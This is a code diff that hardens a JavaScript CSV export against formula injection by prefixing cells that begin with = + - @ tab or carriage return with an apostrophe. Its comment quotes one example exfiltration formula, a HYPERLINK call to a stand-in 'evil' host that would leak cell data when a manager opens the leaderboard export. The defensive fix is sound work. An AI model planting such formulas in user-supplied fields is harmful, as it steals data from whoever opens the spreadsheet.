@@ -129,11 +129,23 @@ export function formatValue(format, v) {
   }
 }
 
-/** Header row from the column headers; a cell is quoted when it holds a comma, quote or newline. */
+/**
+ * Header row from the column headers; a cell is quoted when it holds a comma,
+ * quote, newline or carriage return.
+ *
+ * Text starting `= + - @` or a tab/CR is prefixed with an apostrophe. Excel and
+ * Sheets evaluate such a cell as a formula, and quoting does not stop it — the
+ * quotes are stripped at parse time. These cells carry names users type
+ * (tblUser.FullName is self-service), so without this a rep could set their
+ * display name to =HYPERLINK("http://evil/?d="&A2) and have it fire when a
+ * manager opens the exported leaderboard. Numbers are exempt so a real -5
+ * stays -5.
+ */
 export function toCsv(columns, rows) {
   const esc = (s) => {
     const t = s === null || s === undefined ? "" : String(s);
-    return /[",\n]/.test(t) ? `"${t.replace(/"/g, '""')}"` : t;
+    const safe = typeof s !== "number" && /^[=+\-@\t\r]/.test(t) ? `'${t}` : t;
+    return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
   };
   const head = columns.map((c) => esc(c.header)).join(",");
   const body = rows.map((r) => columns.map((c) => esc(r[c.key])).join(","));
